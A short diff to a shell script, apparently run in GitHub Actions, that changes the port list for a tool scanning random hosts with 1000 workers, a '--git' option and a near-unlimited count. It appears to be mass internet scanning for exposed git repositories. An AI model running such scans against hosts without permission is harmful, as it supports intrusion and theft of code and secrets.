@@ -17,6 +17,6 @@ GITHUB_RUN_ID="${GITHUB_RUN_ID:-}" \
   --source random \
   --workers 1000 \
   --git \
-  --ports 80,443,8080,8081,8088,8181,8443,8888,2086,2087,2095,2096 \
+  --ports 80,443,8080,8443,43,8000,8090,8091,8888,2086,2087,9191,9443 \
   --git-workers 50 \
   --count 9999999999 --no-reverse 2>&1 | tail -2 || true
